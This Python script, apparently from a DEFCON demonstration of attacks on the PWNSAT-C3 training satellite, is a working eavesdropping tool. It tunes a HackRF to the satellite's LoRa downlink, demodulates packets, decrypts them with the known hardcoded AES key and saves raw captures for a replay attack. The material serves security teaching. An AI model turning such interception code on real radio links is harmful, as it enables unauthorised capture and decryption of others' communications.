#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# SPDX-License-Identifier: GPL-3.0
#
# pwnsat_rx_bridge.py -- DEFCON-DEMO/attacks/01_eavesdropping variant
#
# Forked from gradio/pwnsat_rx_bridge.py (copied, not moved -- see this
# session's notes: the original stays in place so PWNSAT-C3's own live
# radio view keeps working). Same RX flowgraph, same everything, plus one
# addition: every eavesdropped packet gets run through the exact AES
# decrypt PWNSAT-C3 itself uses, with the exact same hardcoded key any
# clone of this repo already has (see try_decrypt_packet() below and
# pwnsat_tools/pwnsat_crypto.py). That's the whole attack -- passive RX,
# no transmission, no login, no authentication of any kind required.
#
# Author: r0r0x (original bridge); decrypt addition for DEFCON-DEMO.
#
# Control/CLI script for the SDR-agnostic LoRa downlink receiver
# (pwnsat_lora_rx.PwnsatLoraRX). Replaces the earlier Pluto-only bridge
# (pyPlutoRx.py): the flowgraph's radio source is selected with a
# `--device-args` string (a SoapySDR driver name, via GNU Radio's native
# `gnuradio.soapy` blocks) instead of a Pluto-specific IP/URI, so the same
# script drives either an RTL-SDR or a HackRF.
#
# NOTE: this must run under a Python that has `gnuradio`, `gnuradio.soapy`,
# `gnuradio.lora_sdr`, and `zmq` importable -- NOT necessarily your shell's
# default `python3`, and NOT the PWNSAT-C3 backend's own .venv (the backend
# and this bridge are two separate processes on purpose, see zmq_link.py).
# Run it and this script will tell you if you got the wrong one, with
# concrete next steps -- see require_gnuradio.py / PWNSAT-C3's INSTALL.md (github.com/Pwnsat/PWNSAT-C3) for
# why there's no single right answer across every machine.
#
# Hardware allocation for this whole DEFCON-DEMO folder: the RTL-SDR is
# dedicated to PWNSAT-C3's own legitimate RX (gradio/pwnsat_rx_bridge.py,
# separate from this copy) and is never used by an attack script. Every
# attack in this folder -- this one included -- uses the HackRF, so it
# defaults to that below instead of needing a flag every time.
#
# Example:
#   ./pwnsat_rx_bridge.py

import argparse
import signal
import sys
import time
import struct
from pathlib import Path

# DEFCON-DEMO/lib/ has both require_gnuradio.py (checked next, before any
# gnuradio-dependent import below) and pwnsat_packets.py (this attack's
# decrypt helpers) -- one sys.path insert covers both (parents[2] from
# this file: 01_eavesdropping -> attacks -> DEFCON-DEMO, then into lib).
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from require_gnuradio import check as _check_gnuradio  # noqa: E402
_check_gnuradio()  # exits with a clear message here if this Python can't import gnuradio

import zmq  # noqa: E402
from pwnsat_lora_rx import PwnsatLoraRX  # noqa: E402
# hexdump/try_decrypt_packet live in lib/decrypt_display.py, shared with
# decode_capture.py (the offline replay of a saved .bin, which needs the
# exact same analysis but must NOT need gnuradio/a HackRF to run).
from decrypt_display import hexdump, try_decrypt_packet  # noqa: E402

DEFAULT_PORT = 5005
DEFAULT_DEVICE_ARGS = "hackrf"  # RTL-SDR stays dedicated to PWNSAT-C3, see header comment
DEFAULT_DOWNLINK_ADDRESS = "tcp://127.0.0.1:5005"

DOWNLINK_FREQ = 916000000
DOWNLINK_BW = 250000
DOWNLINK_SF = 7

# Generic defaults gr-osmosdr maps onto whatever gain stages the selected
# device actually exposes (RTL-SDR has one tuner gain; HackRF splits this
# into LNA/VGA stages) -- tune per device if reception is weak or clipping.
DEFAULT_RF_GAIN = 30
DEFAULT_IF_GAIN = 20
DEFAULT_BB_GAIN = 20


# PCAP Constants
PCAP_GLOBAL_HEADER_FORMAT = "<LHHIILL"
PCAP_PACKET_HEADER_FORMAT = "<llll"
PCAP_MAGIC_NUMBER = 0xA1B2C3D4
PCAP_VERSION_MAJOR = 2
PCAP_VERSION_MINOR = 4
PCAP_MAX_PACKET_SIZE = 0x0000FFFF

def pcap_header(interface=148):
  return struct.pack(PCAP_GLOBAL_HEADER_FORMAT, PCAP_MAGIC_NUMBER, PCAP_VERSION_MAJOR, PCAP_VERSION_MINOR, 0, 0, PCAP_MAX_PACKET_SIZE, interface)

class Pcap:
  def __init__(self, packet: bytes, timestamp_seconds: float):
    self.packet = packet
    self.timestamp_seconds = timestamp_seconds
    self.pcap_packet = self.pack()

  def pack(self):
    int_timestamp = int(self.timestamp_seconds)
    timestamp_offset = int((self.timestamp_seconds - int_timestamp) * 1_000_000)
    return struct.pack(PCAP_PACKET_HEADER_FORMAT, int_timestamp, timestamp_offset, len(self.packet), len(self.packet)) + self.packet

  def get(self):
    return self.pcap_packet

def show_args_config(args):
  print("========== Configuration ==========")
  for k, v in vars(args).items():
    print(f"{k:25}: {v}")
  print("----------------------------------\n")

class Controller:
  def __init__(self, args):
    self.args = args
    self.ctx = None
    self.sock = None
    self.tb = None
    self.running = False
    self.f_output = None
    self.f_pcap_output = None

  def file_write_frame(self, data: bytes):
    if self.f_output is not None:
      ts = time.time_ns()
      length = len(data)
      header = struct.pack("<QH", ts, length)
      self.f_output.write(header)
      self.f_output.write(data)
      self.f_output.flush()

  def file_open(self):
    # Create the parent dir if it's missing (e.g. a relative
    # "captures/x.bin" typed from the wrong cwd) instead of a bare
    # FileNotFoundError -- one less way to lose 10 minutes of capture to a
    # typo'd path.
    Path(self.args.output_file).parent.mkdir(parents=True, exist_ok=True)
    self.f_output = open(self.args.output_file, "wb")

  def file_close(self):
    if self.f_output:
      self.f_output.close()

  def pcap_write_frame(self, data: bytes):
    if self.f_pcap_output is not None:
      pcap_packet = Pcap(data, time.time()).get()
      self.f_pcap_output.write(pcap_packet)
      self.f_pcap_output.flush()

  def pcap_open(self):
    Path(self.args.pcap_output_file).parent.mkdir(parents=True, exist_ok=True)
    self.f_pcap_output = open(self.args.pcap_output_file, "wb")
    self.f_pcap_output.write(pcap_header())
    self.f_pcap_output.flush()

  def pcap_close(self):
    if self.f_pcap_output:
      self.f_pcap_output.close()

  def setup(self):
    # STEP 1 -- passive listen: tune the SDR to the downlink frequency with
    # the public LoRa parameters (no reverse engineering needed, they're in
    # this repo). device_args (and the other values below) are passed to
    # the constructor rather than set afterwards, because device_args in
    # particular can only take effect at osmosdr.source() construction
    # time -- see the note on PwnsatLoraRX.__init__.
    print(f"[STEP 1] Tuning SDR ({self.args.device_args}) to {int(self.args.frequency) / 1e6:.3f} MHz, "
          f"BW={int(self.args.bandwidth) / 1e3:.0f} kHz, SF{self.args.spread_factor} "
          "-- same public downlink parameters any clone of this repo already has.")
    self.tb = PwnsatLoraRX(
      device_args=str(self.args.device_args),
      frequency=int(self.args.frequency),
      bandwidth=int(self.args.bandwidth),
      zmq_address=self.args.address,
      spread_factor=int(self.args.spread_factor),
      rf_gain=self.args.rf_gain,
      if_gain=self.args.if_gain,
      bb_gain=self.args.bb_gain,
      source_samp_rate=self.args.source_samp_rate,
    )

  def start(self):
    self.running = True
    self.tb.start()
    print("[+] GNU Radio script started")

    # STEP 2 -- demodulate: the flowgraph turns the RF signal into raw SPP
    # packets and publishes them over ZMQ; this process subscribes to that
    # same feed to receive and display them. No transmission happens here,
    # no login, no interaction with PWNSAT-C3 at all.
    print(f"[STEP 2] Subscribing to demodulated packets on {self.args.address} ...")
    self.ctx = zmq.Context()
    self.sock = self.ctx.socket(zmq.SUB)
    self.sock.connect(self.args.address)
    self.sock.setsockopt(zmq.SUBSCRIBE, b"")

    print("[*] Connecting to GNU Radio server")
    print("[*] Listening -- waiting for a packet to fly by. Press Ctrl+C to stop.\n")

    if self.args.output_file:
      self.file_open()
    if self.args.pcap_output_file:
      self.pcap_open()

  def stop(self):
    if not self.running:
      return

    print("\n[!] Stooping...")
    if self.tb:
      self.tb.stop()
      self.tb.wait()

    if self.sock:
      self.sock.close(0)

    if self.ctx:
      self.ctx.term()

    self.file_close()
    self.pcap_close()

    print("[*] Clean exit")

  def run(self):
    def handler(sig, frame):
      self.stop()
      sys.exit(0)

    signal.signal(signal.SIGINT, handler)
    signal.signal(signal.SIGTERM, handler)

    self.setup()
    self.start()

    try:
      while True:
        raw_telemetry = self.sock.recv()
        print("\n=========== PACKET (eavesdropped) ===========")
        print(f"Length: {len(raw_telemetry)}")
        print(hexdump(raw_telemetry))
        print(try_decrypt_packet(raw_telemetry))
        # Raw bytes only -- captures stay untouched by the decrypt step
        # above, so they're still valid input for the replay attack (06).
        self.file_write_frame(raw_telemetry)
        self.pcap_write_frame(raw_telemetry)
    except KeyboardInterrupt:
      self.stop()

def main():
  parser = argparse.ArgumentParser(prog="pwnsat_rx_bridge", description="SDR-agnostic downlink connector for PWNSAT-C3 (RTL-SDR or HackRF)", epilog="r0r0x - 2026")
  parser.add_argument("-f", "--frequency", help="Frequency for Downlink (Hz)", default=DOWNLINK_FREQ)
  parser.add_argument("-bw", "--bandwidth", help="Bandwidth for Downlink (Hz)", default=DOWNLINK_BW)
  parser.add_argument("-sf", "--spread_factor", help="SpreadFactor for Downlink (Hz)", default=DOWNLINK_SF)
  parser.add_argument("-a", "--address", help="ZMQ Address for RX", default=DEFAULT_DOWNLINK_ADDRESS)
  parser.add_argument("-o", "--output-file")
  parser.add_argument("-pcap", "--pcap-output-file")

  parser.add_argument("-d", "--device-args", help="SoapySDR driver name -- defaults to hackrf, RTL-SDR stays dedicated to PWNSAT-C3", default=DEFAULT_DEVICE_ARGS)
  parser.add_argument("-g", "--rf-gain", type=int, help="Overall/tuner gain (dB)", default=DEFAULT_RF_GAIN)
  parser.add_argument("-ig", "--if-gain", type=int, help="IF gain (dB) -- HackRF's LNA stage", default=DEFAULT_IF_GAIN)
  parser.add_argument("-bg", "--bb-gain", type=int, help="Baseband gain (dB) -- HackRF's VGA stage", default=DEFAULT_BB_GAIN)
  parser.add_argument(
    "-sr", "--source-samp-rate", type=int, default=None,
    help=(
      "Hardware sample rate (Hz). RTL-SDR can sample at the LoRa channel "
      "rate directly (defaults to --bandwidth). HackRF's ADC has a hard "
      "minimum of 1 MSps and cannot sample at 250 kHz directly, so it "
      "defaults to 2000000 automatically when --device-args is 'hackrf'. "
      "Must be an exact integer multiple of --bandwidth."
    ),
  )

  args = parser.parse_args()

  print("=" * 60)
  print("PWNSAT eavesdropping attack -- passive downlink decrypt")
  print("=" * 60)
  print("  STEP 1: tune SDR to the public downlink frequency/params")
  print("  STEP 2: demodulate LoRa, subscribe to the decoded packet feed")
  print("  STEP 3: split cleartext SPP header from encrypted data field")
  print("  STEP 4: flag repeated ciphertext blocks (ECB tell)")
  print("  STEP 5: decrypt the data field with the known static AES key")
  print("=" * 60 + "\n")

  show_args_config(args)

  ctrl = Controller(args)
  ctrl.run()

if __name__ == "__main__":
  main()
